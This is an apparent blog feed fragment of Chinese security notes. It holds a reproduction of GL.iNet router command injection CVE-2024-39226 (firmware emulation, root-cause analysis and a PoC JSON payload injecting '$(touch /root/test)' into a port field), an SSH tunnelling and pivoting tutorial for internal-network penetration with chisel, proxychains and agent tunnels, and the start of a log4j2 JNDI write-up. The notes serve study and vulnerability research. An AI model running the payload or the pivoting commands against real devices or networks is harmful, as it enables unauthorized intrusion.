        <content type="html"><![CDATA[<h1 id="CVE-2024-39226"><a href="#CVE-2024-39226" class="headerlink" title="CVE-2024-39226"></a>CVE-2024-39226</h1><p>CVE信息：<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39226">https://nvd.nist.gov/vuln/detail/CVE-2024-39226</a><br>官方固件下载网址：<a href="https://dl.gl-inet.cn/">https://dl.gl-inet.cn/</a> (下载固件版本：GL-AX1800 Flint 4.5.16)</p><h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><p>还是按这个来吧<a href="https://www.iotsec-zone.com/article/477">CVE-2024-39226 GL-iNet 路由器RPC漏洞复现 - IOTsec-Zone</a></p><p><code>GL.iNet</code>官网提供历史<a href="https://dl.gl-inet.cn/">固件下载</a>[2]。</p><pre class="language-none"><code class="language-none">固件版本：GL-AX1800 Flint 4.5.16</code></pre><p><code>sysupgrade-glinet_ax1800</code>文件夹下存在<code>root</code>文件。</p><pre class="language-none"><code class="language-none">$ file root root: Squashfs filesystem, little endian, version 4.0, 44613986 bytes, 4754 inodes, blocksize: 262144 bytes, created: Thu Mar 21 13:28:00 2024</code></pre><p>使用<code>binwalk</code>，从<code>root</code>中提取<code>Squashfs</code>文件系统。</p><pre class="language-none"><code class="language-none">$ binwalk -Me root</code></pre><p>查看<code>bin/busybox</code>得知是<code>32位arm</code>架构。</p><pre class="language-none"><code class="language-none">$ file squashfs-root&#x2F;bin&#x2F;busybox squashfs-root&#x2F;bin&#x2F;busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-musl-arm.so.1, stripped</code></pre><h3 id="QEMU模拟"><a href="#QEMU模拟" class="headerlink" title="QEMU模拟"></a>QEMU模拟</h3><p>使用<code>qemu-system-arm</code>从系统角度进行模拟，此时需要一个<code>arm</code>架构的内核镜像和文件系统，可以在这个<a href="https://people.debian.org/~aurel32/qemu/">网站</a>下载[3]。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202505271945829.png" alt="image-20250527194513730"></p><pre class="language-none"><code class="language-none">vmlinuz-3.2.0-4-vexpress  linux内核镜像文件initrd.img-3.2.0-4-vexpress  RAM磁盘映像文件debian_wheezy_armhf_standard.qcow2  虚拟磁盘映像文件</code></pre><p>启动虚拟环境</p><p>宿主机配置网卡（用于和虚拟机机通信）</p><pre class="language-sh" data-language="sh"><code class="language-sh">sudo tunctl -t tap0sudo ifconfig tap0 192.168.3.1&#x2F;24 up</code></pre><pre class="language-sh" data-language="sh"><code class="language-sh">sudo qemu-system-arm -M vexpress-a9 -cpu cortex-a15 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if&#x3D;sd,file&#x3D;debian_wheezy_armhf_standard.qcow2 -append &quot;root&#x3D;&#x2F;dev&#x2F;mmcblk0p2&quot; -net nic -net tap,ifname&#x3D;tap0,script&#x3D;no,downscript&#x3D;no -nographic</code></pre><p>启动后用户名和密码都是<code>root</code>即可登录模拟的系统。</p><p>接下来在宿主机创建一个网卡，使<code>qemu</code>内能和宿主机通信。</p><p>arm虚拟机模拟起来后，配置虚拟机网卡</p><pre class="language-sh" data-language="sh"><code class="language-sh">ifconfig eth0 192.168.3.2&#x2F;24 up</code></pre><p>这样宿主机和模拟环境互通，使用<code>scp</code>将<code>squashfs-root</code>文件夹上传到<code>qemu</code>系统中的<code>/root</code>路径下。</p><pre class="language-none"><code class="language-none">scp -r squashfs-root&#x2F; root@192.168.3.2:&#x2F;root</code></pre><p>然后挂载<code>proc</code>、<code>dev</code>，最后<code>chroot</code>即可。</p><pre class="language-none"><code class="language-none">root@debian-armhf:~# mount -t proc &#x2F;proc .&#x2F;squashfs-root&#x2F;procroot@debian-armhf:~# mount -o bind &#x2F;dev .&#x2F;squashfs-root&#x2F;devroot@debian-armhf:~# chroot .&#x2F;squashfs-root&#x2F; shBusyBox v1.33.2 (2024-03-21 13:28:00 UTC) built-in shell (ash)&#x2F; # lsbin      etc      lib      overlay  rom      sbin     tmp      vardev      init     mnt      proc     root     sys      usr      www</code></pre><h3 id="启动web服务"><a href="#启动web服务" class="headerlink" title="启动web服务"></a>启动web服务</h3><pre class="language-sh" data-language="sh"><code class="language-sh">&#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf -g &#39;daemon off;&#39;#手动创建缺失的目录mkdir -p &#x2F;var&#x2F;log&#x2F;nginxmkdir -p &#x2F;var&#x2F;lib&#x2F;nginx&#x2F;bodymkdir -p &#x2F;var&#x2F;run</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506041747181.png" alt="image-20250528050416205"></p><p>其实到这步服务已经启动了，对于复现漏洞来说web页面可有可无，但是如果想显示web页面</p><pre class="language-none"><code class="language-none">.&#x2F;etc&#x2F;init.d&#x2F;boot boot.&#x2F;etc&#x2F;uci-defaults&#x2F;network_gl.&#x2F;etc&#x2F;init.d&#x2F;boot boot&#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf -g &#39;daemon off;&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506041747199.png" alt="image-20250528050746863"></p><h3 id="漏洞触发环境"><a href="#漏洞触发环境" class="headerlink" title="漏洞触发环境"></a>漏洞触发环境</h3><p><code>ubus</code>服务</p><pre class="language-none"><code class="language-none">&#x2F;sbin&#x2F;ubusd&#x2F;usr&#x2F;bin&#x2F;fcgiwrap -c 6 -s unix:&#x2F;var&#x2F;run&#x2F;fcgiwrap.socket&#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf -g &#39;daemon off;&#39;</code></pre><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>请求的路径是<code>rpc</code>时</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202505290651854.png" alt="image-20250529065131785"></p><p>对应的处理逻辑在/usr/share/gl-ngx/oui-rpc.lua</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202505290629333.png" alt="image-20250529062956261"></p><p>/usr/lib/lua/oui/rpc.lua</p><p><code>access</code>通过<code>is_local</code>判断是否本地请求。对于本地请求和<code>glinet</code>标头的请求，总是允许访问</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202505290636626.png" alt="image-20250529063604554"></p><p><code>M.call</code>函数是核心的<code>rpc</code>调用处理器，执行以下步骤：</p><ol><li>检查请求的对象是否已加载，如果未加载，则尝试从<code>/usr/lib/oui-httpd/rpc/</code>目录下加载脚本文件。</li><li>如果脚本文件存在且加载成功，将对象的方法注册到<code>objects</code>表中。</li><li>如果无法从<code>/usr/lib/oui-httpd/rpc/</code>目录下加载脚本文件或者找不到对象或方法，则调用<code>glc_call</code>执行。</li></ol><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202505290638557.png![image-20250529063956054](https://epicture.oss-cn-beijing.aliyuncs.com/htb/202505290639103.png" alt="image-20250529063825515"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202505290640142.png" alt="image-20250529064008092">由于<code>/usr/lib/oui-httpd/rpc/</code>目录下是二进制<code>s2s.so</code>文件，无法直接加载，则通过<code>glc_call</code>调用<code>/cgi-bin/glc</code>执行 C 程序实现的 RPC 方法</p><p>该程序通过 CGI 接收 POST 请求，并读取 <code>CONTENT_LENGTH</code> 和输入体，对其执行 <code>json_loads()</code> 加载为 <code>v9</code>，然后通过json_unpack_ex提取出：</p><ul><li><code>v30</code> ← <code>&quot;object&quot;</code> 字段值（决定 so 名称）</li><li><code>name</code> ← <code>&quot;method&quot;</code> 字段值（决定函数名称）</li><li><code>v32</code> ← <code>&quot;params&quot;</code>（被传给函数的第一个参数）</li></ul><p>/cgi-bin/glc中使用 <code>dlopen</code> 动态加载共享库，路径是<code>/usr/lib/oui-httpd/rpc/</code>目录下的文件</p><p><code>name_1 = (int (__fastcall *)(int, int))dlsym(hs, name);</code>加载方法</p><p><code>v22 = name_1(v32, v15);</code>调用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202505290644913.png" alt="image-20250529064415828"></p><p>poc:</p><pre class="language-json" data-language="json"><code class="language-json">&#123;    &quot;method&quot;: &quot;call&quot;,    &quot;params&quot;: [&quot;&quot;, &quot;s2s&quot;, &quot;enable_echo_server&quot;, &#123;&quot;port&quot;: &quot;7 $(touch &#x2F;root&#x2F;test)&quot;&#125;]     &#x2F;&#x2F;sid, object, method, args&#125;&#123;    &quot;object&quot;:&quot;s2s&quot;,    &quot;method&quot;:&quot;enable_echo_server&quot;,    &quot;args&quot;:&#123;&quot;port&quot;:&quot;7 $(touch &#x2F;root&#x2F;test2024)&quot;&#125;&#125;</code></pre><p><strong>本地</strong></p><p>s2s.so中</p><p>虽然代码中检查了<code>port</code>参数是否为有效的数字，但没有严格限制其内容，仅验证了其是否为正数且小于 65535。然而，在字符串形式下，它仍然允许嵌入特殊字符，如<code>$()</code>，这些字符可以被 shell 解释器解析为命令。</p><p>在<code>v16(v27, 128, &quot;%s -p %s -f&quot;, &quot;/usr/bin/echo_server&quot;, v9);</code>中，<code>port</code>参数 (<code>v9</code>) 被直接传递给<code>snprintf</code>函数，生成的命令字符串随后通过<code>system(v27);</code>执行。</p><p>由于<code>v9</code>可以包含类似<code>7 $(touch /root/test)</code>的字符串，shell 会执行其中的命令<code>touch /root/test</code>，导致命令注入。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506041747214.png" alt="image-20250528055150417"></p><p><strong>远程</strong></p><p>如果直接请求<code>/cgi-bin/glc</code>路径，将会调用<code>glc_call</code>函数。<code>glc_call</code>函数会向另一个内部路径（<code>/cgi-bin/glc</code>）发起一个内部 HTTP POST 请求，并传递方法名称、参数等信息。执行<code>call</code>方法并且跳过之前的权限校验，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506041747235.png" alt="image-20250528055505932"></p><p>漏洞如何发现</p><h3 id="漏洞可利用性分析"><a href="#漏洞可利用性分析" class="headerlink" title="漏洞可利用性分析"></a><strong>漏洞可利用性分析</strong></h3><p>本地利用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506041747245.png" alt="image-20250528052929599"></p><p>远程利用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506041747251.png" alt="image-20250528052809112"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506041747164.png" alt="image-20250528052844305"></p><h3 id="防御机制突破方法"><a href="#防御机制突破方法" class="headerlink" title="防御机制突破方法"></a>防御机制突破方法</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH隧道搭建与端口转发</title>
      <link href="/2025/06/04/SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2025/06/04/SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH隧道搭建与端口转发"><a href="#SSH隧道搭建与端口转发" class="headerlink" title="SSH隧道搭建与端口转发"></a>SSH隧道搭建与端口转发</h1><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>SSH 端口转发又叫 SSH 隧道（tunnel），是在 SSH 连接的基础上，通过将客户端或服务器端的某个端口的数据放到 SSH 连接中加密传输，从而在不安全的网络中安全的传输数据或者绕过防火墙的限制实现对目的主机目的端口的访问的一个功能。</p><p>安全性高：SSH隧道利用SSH协议进行加密传输，可以确保数据传输的安全性。<br>稳定性强：SSH协议是一种稳定、可靠的协议，可以确保数据传输的准确性和稳定性。<br>传输效率低：传输效率不如其他协议的隧道<br>前提是需要对方开启ssh服务，并且知道对方的ssh账号和密码</p><p>不同的后端站点所拿到的shell权限是不一样的。php、aspx的权限是继承中间件的，需要提权。是最低权限，而Java确实最高权限，无需提权。</p><p>参数</p><ul><li>-C：压缩传输</li><li>-f：将ssh转⼊后台，不占⽤当前shell</li><li>-N：静默连接，减少被发现</li><li>-g：允许远程主机连接本地用于端口转发</li><li>-L：本地端⼝转发</li><li>-R：远程点开转发</li><li>-D：动态端⼝</li><li>-P：指定ssh端口</li></ul><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>ssh-keygen -A 初始化</p><p>vim /etc/ssh/sshd_config 配置⽂件</p><p> PermitRootLogin yes 允许root登⼊</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506022014904.png" alt="img"></p><h2 id="1-1-静态端口转发"><a href="#1-1-静态端口转发" class="headerlink" title="1.1 静态端口转发"></a>1.1 静态端口转发</h2><h3 id="1-1-1-本地端口转发"><a href="#1-1-1-本地端口转发" class="headerlink" title="1.1.1 本地端口转发"></a>1.1.1 本地端口转发</h3><p>场景：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506022031926.png" alt="img"></p><p>本地主机（A）、跳板机（B）、目标主机（C）</p><p>A指定本地端口访问通过SSH连接转发给B，B将这些数据转发给C，同时将结果传回给A。（一般情况下B的端口是远程连接端口）</p><p>使用：</p><pre class="language-none"><code class="language-none">ssh -CfNg -L 本地端口:目标ip:目标端口 跳板账号@ip</code></pre><p>将目标ip的目标端口的流量通过跳板机转发到本地的端口上</p><p>例子</p><pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -L 8888:192.168.1.100:80 user@10.0.0.1</code></pre><p>你本地（127.0.0.1）监听 <code>8888</code> 端口；</p><p>当你访问 <code>http://127.0.0.1:8888</code> 时：</p><ul><li>SSH 会通过 <code>user@10.0.0.1</code> 这个跳板机（比如公网服务器）连接；</li><li>然后在 <strong>10.0.0.1 机器上发起对 <code>192.168.1.100:80</code> 的访问请求</strong>；</li><li>并把返回的数据通过 SSH 隧道转发回本地端口 <code>8888</code></li></ul><h3 id="1-1-2-远程端⼝转发"><a href="#1-1-2-远程端⼝转发" class="headerlink" title="1.1.2 远程端⼝转发"></a>1.1.2 远程端⼝转发</h3><p>场景：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506022031278.png" alt="img"></p><p>B需要使用内网C的端口，但是无法直接访问，需要A对B发起ssh连接，并将B的自定义端口转发到C端口上，使得B访问自身自定义端口便可以访问C的端口</p><p>使用：</p><pre class="language-none"><code class="language-none">A：ssh -CfNg -R 端⼝:⽬标ip:⽬标端⼝ 跳板账号@ip</code></pre><p>例子：</p><pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -R 8888:127.0.0.1:22 user@10.0.0.1</code></pre><p>在 <strong>跳板机（10.0.0.1）上开启 8888 端口监听</strong>；</p><p>当跳板机访问 <code>localhost:8888</code> 时，SSH 会将连接反向转发给你本地的 <code>127.0.0.1:22</code>（即你的 SSH）；</p><p>相当于你把自己的 <strong>SSH 暴露到了跳板机的 8888 端口</strong>。</p><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>本地端口转发的目的是为了通过本地访问被攻击ip的对应端口的服务，</p><pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -L 8888:192.168.1.100:80 user@10.0.0.1</code></pre><p>的目的就算在本地访问127.0.0.1:8888时通过跳板机10.0.0.1访问到192.168.1.100:80上的服务</p><p>远程端口转发的目的则是让被攻击ip能够访问本地的服务（ 比如反弹shell），</p><pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -R 8888:127.0.0.1:22 user@10.0.0.1</code></pre><p>此时如果有人访问10.0.0.1的8888端口，SSH 会把这个请求转发给你本地的 <code>localhost:22</code>。</p><h2 id="1-2-动态端口转发"><a href="#1-2-动态端口转发" class="headerlink" title="1.2 动态端口转发"></a>1.2 动态端口转发</h2><ul><li>动态端口转发，<strong>相当于在 ssh 发起端创建一个 SOCKS 代理服务</strong>，所有使用这个 socks 的请求，都将转发到 ssh 远端，并将由 ssh 远端发起数据请求，并返回给 ssh 发起端，发起端将数据送回请求端。</li><li>这种转发<strong>不规定目标主机和目标端口，</strong>而是去读取应用发起的请求，从请求中获取目标信息。在这种情况下，SSH 服务器要去访问哪一个网站，完全是动态的，取决于原始通信，所以就叫做动态端口转发。</li><li>SOCKS：防火墙安全会话转换协议 （Socks: Protocol for sessions traversal across firewall securely） SOCKS协议提供一个框架，为在 TCP和UDP域中的客户机/服务器应用程序能更方便安全地使用网络防火墙所提供的服务。协议工作在OSI参考模型的第5层(会话层)，使用TCP协议传输数据，因而不提供如传递 ICMP信息之类的网络层网关服务。</li><li>SOCKS代理使用范围很广，但SOCKS有SOCK4和SOCK5之分。其中SOCK4只支持TCP协议，SOCK5支持TCP和UDP协议，还支持身份验证、服务器端域名解释等。SOCK4能干的SOCK5都可以干，反过来就不行。我们常用的聊天软件(如QQ)，起初就一直用的是TCP和UDP协议，所以只能用SOCK5的代理。</li></ul><p>本地主机（A）、跳板机（B）、随机目标机（C）</p><p>A的自定义端口作为socks服务端口，请求发送到本地端口，本地端口就把请求转发到跳板机上</p><p>用法：</p><pre class="language-sh" data-language="sh"><code class="language-sh">ssh -CfNg -D 本地端口 跳板账号@ip</code></pre><p>例子（现在似乎是socket5？）：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/htb/202506022058997.png" alt="image-20250602205851679"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><pre class="language-none"><code class="language-none">你本地Kali    ⇩（SSH）VPS（168.2.10.2）   ⇩（攻击&#x2F;反弹 shell）靶机（172.1.100.2）   ⇩（RDP 弱口令登录）Windows（192.1.10.222）   ⇩（代理&#x2F;隧道）深内网（192.168.50.0&#x2F;24）</code></pre><h3 id="如何让本地kali可直接访问172-1-100-2"><a href="#如何让本地kali可直接访问172-1-100-2" class="headerlink" title="如何让本地kali可直接访问172.1.100.2"></a>如何让本地kali可直接访问172.1.100.2</h3><h4 id="①-启动-SOCKS5-代理："><a href="#①-启动-SOCKS5-代理：" class="headerlink" title="① 启动 SOCKS5 代理："></a>① 启动 SOCKS5 代理：</h4><pre class="language-sh" data-language="sh"><code class="language-sh">ssh -D 1080 root@168.2.10.2</code></pre><ul><li><code>-D 1080</code> 表示在本地 Kali 开一个 SOCKS5 代理监听在 127.0.0.1:1080</li></ul><h4 id="②-配置-proxychains："><a href="#②-配置-proxychains：" class="headerlink" title="② 配置 proxychains："></a>② 配置 proxychains：</h4><p>编辑 <code>/etc/proxychains.conf</code>（或 <code>/etc/proxychains4.conf</code>）：</p><pre class="language-sh" data-language="sh"><code class="language-sh"># 最后一行添加或替换为：socks5 127.0.0.1 1080</code></pre><h4 id="③-使用-proxychains-访问-172-1-100-2："><a href="#③-使用-proxychains-访问-172-1-100-2：" class="headerlink" title="③ 使用 proxychains 访问 172.1.100.2："></a>③ 使用 proxychains 访问 172.1.100.2：</h4><pre class="language-sh" data-language="sh"><code class="language-sh">proxychains fscan -h 172.1.100.2proxychains ssh user@172.1.100.2</code></pre><h3 id="如何让本地kali可以直接访问192-1-10-222（存疑，有时间搭一下环境试试）"><a href="#如何让本地kali可以直接访问192-1-10-222（存疑，有时间搭一下环境试试）" class="headerlink" title="如何让本地kali可以直接访问192.1.10.222（存疑，有时间搭一下环境试试）"></a>如何让本地kali可以直接访问192.1.10.222（存疑，有时间搭一下环境试试）</h3><h4 id="方案-1：用-ssh-L-做端口中继（多跳）"><a href="#方案-1：用-ssh-L-做端口中继（多跳）" class="headerlink" title="方案 1：用 ssh -L 做端口中继（多跳）"></a>方案 1：用 <code>ssh -L</code> 做端口中继（多跳）</h4><p>你可以让 VPS 本地监听一个端口，把流量转发给 172.1.100.2：</p><p><strong>步骤如下：</strong></p><p><strong>第一步：从 Kali 到 VPS，建立第一跳代理（假设 VPS 是 168.2.10.2）</strong></p><pre class="language-none"><code class="language-none">Kali上执行ssh -L 9000:127.0.0.1:9001 user@168.2.10.2</code></pre><p>这一步的意思是：</p><ul><li>把 Kali 本地 9000 端口映射到 VPS 上的 9001 端口。</li></ul><p><strong>第二步：在 VPS 上执行</strong></p><pre class="language-none"><code class="language-none"># VPS 上执行ssh -D 9001 user@172.1.100.2</code></pre><ul><li>这时候你在 Kali 上访问本地的 9000，就相当于访问到了 VPS 上的 <code>ssh -D 9001</code>。</li><li>这样就实现了一个“间接 socks5”代理。</li></ul><p>然后你在 Kali 上使用：</p><pre class="language-none"><code class="language-none">proxychains fscan -h 192.1.10.222</code></pre><p>（proxychains 配置 <code>socks5 127.0.0.1 9000</code>）</p><hr><h4 id="方案-2：使用-chisel-SSH-多跳构建-socks5-隧道"><a href="#方案-2：使用-chisel-SSH-多跳构建-socks5-隧道" class="headerlink" title="方案 2：使用 chisel + SSH 多跳构建 socks5 隧道"></a>方案 2：使用 <code>chisel</code> + SSH 多跳构建 socks5 隧道</h4><p>比如 <code>proxytunnel</code>、<code>chisel</code>、<code>ssf</code> 等工具就可以链式转发，甚至自动多跳 socks5。</p><hr><p><strong>第 1 步：Kali 连 VPS，建立一个 socks5 客户端口</strong></p><p>在 Kali 上运行：</p><pre class="language-sh" data-language="sh"><code class="language-sh"># Kali 本地监听 1080 端口，作为 socks5 客户端ssh -L 1080:localhost:1080 user@168.2.10.2</code></pre><p>意思是：</p><ul><li>Kali 的 <code>localhost:1080</code> 映射到 VPS 的 <code>localhost:1080</code></li></ul><hr><p><strong>第 2 步：在 VPS 上开启 <code>chisel</code> 客户端，连接 172.1.100.2 上的 <code>chisel</code> 服务器</strong></p><p>2.1 在 172.1.100.2 上运行：</p><pre class="language-sh" data-language="sh"><code class="language-sh"># 让 172.1.100.2 作为 chisel 服务器，提供 socks5 代理.&#x2F;chisel server --port 8000 --socks5</code></pre><p>2.2 在 VPS 上运行：</p><pre class="language-sh" data-language="sh"><code class="language-sh"># VPS 连接到 172.1.100.2，转发 socks5 流量.&#x2F;chisel client 172.1.100.2:8000 R:1080:socks</code></pre><p>这意味着：</p><ul><li>VPS 的本地端口 1080 是一个 socks5 代理，实际是由 172.1.100.2 提供服务的。</li></ul><hr><p><strong>第 3 步：Kali 上配置 proxychains 使用 <code>127.0.0.1:1080</code> 即可访问 192.1.10.222</strong></p><p>配置 <code>/etc/proxychains.conf</code>：</p><pre class="language-none"><code class="language-none">socks5 127.0.0.1 1080</code></pre><p>然后你就可以：</p><pre class="language-none"><code class="language-none">proxychains fscan -h 192.1.10.222</code></pre><p>被控机:./linux_x64_agent -l 192.168.124.129:80(攻击机可访问的地址) -s 80<br>控制端: ./linux_x64_admin -c 192.168.124.129:80 -s 80<br>getshell</p><p>控制端:<br>use 0<br>listen<br>被控机:windows_x64_agent.exe -c 192.168.20.128:10001 -s 80</p><p>监听端口 -l port -s 盐</p><p>主动连接 -c ip:port  -s 盐</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞</title>
      <link href="/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>看面经和复习期末考试都怪无聊的，看点这个核弹级漏洞</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。阿里云应急响应中心提醒 Apache Log4j2 用户尽快采取安全措施阻止漏洞攻击。</p><p>log4j2远程代码执行漏洞主要由于存在JNDI注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码。</p><p>（阿里好像还因为没先跟cnvd说所以被罚了</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h2><p>Apache Log4j 2是对Log4j的升级，它比其前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，同时修复了Logback架构中的一些问题。是目前最优秀的Java日志框架之一。</p><p>本次漏洞影响范围为Log4j2最早期的版本2.0-beta9到2.14.1。</p><p>由于Log4j2重新构建和设计了框架，所以可以认为两者是完全独立的两个日志组件。但是他们的包还是很相似，这里给出一点差异</p><p>Log4j2分为2个jar包，一个是接口log4j-api-${版本号}.jar，一个是具体实现log4j-core-${版本号}.jar。Log4j只有一个jar包log4j-${版本号}.jar。<br>Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。<br>Log4j2的package名称前缀为org.apache.logging.log4j。Log4j的package名称前缀为org.apache.log4j。</p><p>具体的发展过程可以看看这个<a href="https://paper.seebug.org/1789/%E7%9A%84Java%E6%97%A5%E5%BF%97%E4%BD%93%E7%B3%BB%E9%83%A8%E5%88%86">https://paper.seebug.org/1789/的Java日志体系部分</a></p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>java命名和目录接口</p><p><strong>它就像一个映射关系库，里面有很多资源，每个资源对应一个名字，当我查看这个名字时候，就会提供对应资源。将资源和名字进行了一对一映射。一些基本操作，发布服务bind(),查找服务lookup()。</strong></p><h2 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h2><p> 轻型目录访问协议</p><p>LDAP可以理解是一个简单存储数据的数据库，不过它是树状结构的，树形结构存储数据，查询效率更高。</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>第一个是由于JNDI的动态协议转换，即使初始化的context指定了协议，也会根据URL传入的参数来转换协议。</p><p>其实就是说即使提前配置了Context.PROVIDER_URL属性，当我们调用lookup()方法时，如果lookup方法的参数是一个url地址，那么客户端就会去lookup()方法参数指定的uri中加载远程对象，而不是去Context.PROVIDER_URL设置的地址去加载对象。</p><p>正是因为有这个特性，才导致当lookup()方法的参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。</p><p>第二个是由于JNDI Naming Reference，Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 LDAP 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p><p>其实可以简单理解为我这LDAP存储空间有限，我把多余的数据放在我的一个web网站里面，可以通过url地址进行引用，查询的数据如果我自己数据库里面没有，我就会自动去我这个指定的地址在web网站查找指定资源。</p><p>（这里jndi注入那篇写的有点赶，所以就没怎么细说原理，就在这里补上了</p><h1 id="Log4j2源码浅析"><a href="#Log4j2源码浅析" class="headerlink" title="Log4j2源码浅析"></a>Log4j2源码浅析</h1><p>然后简单分析一下源码</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>先引入依赖</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.14.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span></code></pre><p>在工程目录resources下创建log4j2.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appenders</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SYSTEM_OUT<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token comment">&lt;!--            配置Console的模式布局--></span>            <span class="token tag"><span class="token tag"><span class="token 